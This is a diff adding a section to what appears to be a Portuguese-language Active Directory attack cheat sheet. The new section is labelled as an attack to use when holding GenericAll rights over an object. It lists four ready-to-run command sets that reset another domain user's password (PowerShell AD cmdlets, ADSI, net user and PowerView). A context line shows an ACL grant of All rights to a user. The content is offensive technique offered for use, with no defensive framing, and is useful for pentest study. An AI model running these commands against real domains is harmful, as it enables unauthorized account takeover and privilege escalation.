@@ -1014,3 +1014,21 @@ Set-acl -aclobject $MyACL $MyDistinguishedNameAD
 ```
 Add-DomainObjectAcl -TargetIdentity 'GROUP-A' -PrincipalIdentity vegeta -Rights All
 ```
+##### ATAQUE - SE TENHO GENERIC ALL SOBRE O OBJETO
+TROCAR A SENHA DO USUÁRIO
+```
+$MyPassword = ConvertTo-SecureString -AsPlainText -Force -String 123QWE@@
+Set-ADAccountPassword -Identity chichi -Reset -NewPassword $MyPassword
+```
+```
+$MyAccount = [ADSI]"LDAP://CN=chichi,CN=Users,DC=TECH,DC=LOCAL"
+$MyAccount.psbase.invoke("SetPassword",'Test123@@')
+$MyAccount.psbase.CommitChanges()
+```
+```
+net user chichi Password123! /domain
+```
+```
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity chichi -AccountPassword $UserPassword
+```
